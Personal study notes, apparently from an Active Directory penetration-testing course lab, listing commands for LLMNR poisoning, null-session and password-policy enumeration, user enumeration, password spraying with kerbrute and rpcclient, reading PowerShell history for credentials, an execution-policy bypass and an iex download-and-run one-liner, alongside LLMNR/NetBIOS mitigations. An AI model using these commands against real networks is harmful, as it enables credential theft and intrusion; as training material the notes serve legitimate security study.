
## Getting hashes and creds

- Responder 
- Inveigh 

#### Mitigation

- disable llmnr 
- ![[Pasted image 20241223130548.png]]
> Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

- NetBios ni mogoče preko GPO
- startup skripta v AD
``` powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

```

## null sessions & pass policies

#### Crackmapexec
```shell
crackmapexec smb <ip> -u <user> -p Password123 --pass-pol
```

#### enum4linux-ng

```bash 
enum4linux-ng -P <ip> -oA <output-file>
```

> JSON in YAML za parsanje


#### ldapsearch

```shell 
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### Windows

```powershell
net use \\DC01\ipc$ "" /u:""
``` 

## Building a user list

### kerbrute

```shell
kerbrute userenum -d <domain> --dc 172.16.5.5 /opt/jsmith.txt 
```

#### ldapsearch

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### PAssword spraying

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### kerbrute

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```


https://wadcoms.github.io/

SNAFFLER -> smb shares enum for pass and keys and other stuff

### Living of the land

| **Description**                                                                                                                                                                                                                               | **Cmd-Let**                                                                                                                |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Lists available modules loaded for use.                                                                                                                                                                                                       | `Get-Module`                                                                                                               |
| Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         | `Get-ExecutionPolicy -List`                                                                                                |
| This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. | `Set-ExecutionPolicy Bypass -Scope Process`                                                                                |
| Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                | `Get-ChildItem Env: \| ft Key,Value`                                                                                       |
| With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       | `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 |
| This is a quick and easy way to download a file from the web using Powe                                                                                                                                                                       | `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` |

#### WMI

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |


### LDAP filtering
![[Pasted image 20241224091626.png]]

``` powershell
dsquery *  -filter "((userAccountControl:1.2.840.113556.1.4.803:=<od zhoraj>))" -attr distinguishedName description
```